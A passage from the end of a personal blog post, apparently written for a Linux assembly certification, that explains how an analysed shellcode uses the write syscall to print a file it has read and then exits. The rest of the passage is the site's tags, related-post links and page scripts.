+</code></pre><p>Arguments required for write:<code class="language-plaintext highlighter-rouge">ssize_t write(int fd, const void *buf, size_t count);</code></p><ul><li>EDX is given the bytes returned from the Read Syscall from through EAX.<li>EAX is given the value of 4, syscall for write.<li>EBX is given value 1, in order to write to the screen through STDOUT.<li>ECX keeps pointing to the buffer where to write bytes from.</ul><p>This will finally write to the screen what has been opened and read.</p><p>The following syscalls beyond the already shown are exit syscalls in order to exit the program gracefully. Furthermore, the resting bytes should be the variables.</p><h4 id="conclusion-shellcode-3"><span class="mr-2">Conclusion (Shellcode #3)</span><a href="#conclusion-shellcode-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>This last shellcode will, open, read, write to the screen what was read and finally exit gracefully the program.</p><h3 id="code"><span class="mr-2">Code</span><a href="#code" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: <a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online- courses/securitytube-linux-assembly-expert/</a></p><p>Student ID: SLAE-27812/PA-27812</p><p>You can find all of the used resources <a href="https://github.com/whitecr0wz/SLAE/">here</a>.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/slae/'>SLAE</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/assembly/" class="post-tag no-text-decoration" >assembly</a> <a href="/tags/shellcoding/" class="post-tag no-text-decoration" >shellcoding</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"></div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=SLAE+-+Assignment+5+-+Analyzing+3rd+party+Shellcode+-+Knowledge+Library&url=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE-Analyzing-Shellcode%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=SLAE+-+Assignment+5+-+Analyzing+3rd+party+Shellcode+-+Knowledge+Library&u=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE-Analyzing-Shellcode%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fwhitecr0wz.github.io%2Fposts%2FSLAE-Analyzing-Shellcode%2F&text=SLAE+-+Assignment+5+-+Analyzing+3rd+party+Shellcode+-+Knowledge+Library" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/VyOS-OSPF-I/">VyOS - OSPF Basic Network</a><li><a href="/posts/Alignments-on-windows-registers/">Alignments on Windows Registers</a><li><a href="/posts/Vulnserver-LTER/">Vulnserver LTER - SEH Extremely restricted character set</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/vulnerability/">vulnerability</a> <a class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/vyos/">VyOS</a> <a class="post-tag" href="/tags/ospf/">OSPF</a> <a class="post-tag" href="/tags/routing/">Routing</a> <a class="post-tag" href="/tags/soho/">SOHO</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/SLAE64-Egghunter/"><div class="card-body"> <em class="small" data-ts="1611467040" data-df="ll" > Jan 24, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE64 - Assignment 3 - Egghunter</h3><div class="text-muted small"><p> Introduction These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have a clo...</p></div></div></a></div><div class="card"> <a href="/posts/SLAE64-Encoder/"><div class="card-body"> <em class="small" data-ts="1611553440" data-df="ll" > Jan 25, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE64 - Assignment 4 - Custom Insertion Encoder</h3><div class="text-muted small"><p> Introduction These series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. Today we are going to have a close look ...</p></div></div></a></div><div class="card"> <a href="/posts/SLAE64-Analyzing-Shellcode/"><div class="card-body"> <em class="small" data-ts="1611639840" data-df="ll" > Jan 26, 2021 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SLAE64 - Assignment 5 - Analyzing 3rd party Shellcode</h3><div class="text-muted small"><p> These series of posts starting with the prefix “SLAE64 - Assignment” will be created in order to fulfill the requirements of the SLAE64 certification. The fifth assignment from the seven requires ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/SLAE-Custom-Encoder/" class="btn btn-outline-primary" prompt="Older"><p>SLAE - Assignment 4 - Custom Insertion Encoder</p></a> <a href="/posts/SLAE-Polymorphic/" class="btn btn-outline-primary" prompt="Newer"><p>SLAE - Assignment 6 - Polymorphic Shellcode</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/whitecr0wz">Felipe Winsnes</a>.</p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/shellcoding/">shellcoding</a> <a class="post-tag" href="/tags/assembly/">assembly</a> <a class="post-tag" href="/tags/vulnerability/">vulnerability</a> <a class="post-tag" href="/tags/networking/">Networking</a> <a class="post-tag" href="/tags/vyos/">VyOS</a> <a class="post-tag" href="/tags/ospf/">OSPF</a> <a class="post-tag" href="/tags/routing/">Routing</a> <a class="post-tag" href="/tags/soho/">SOHO</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
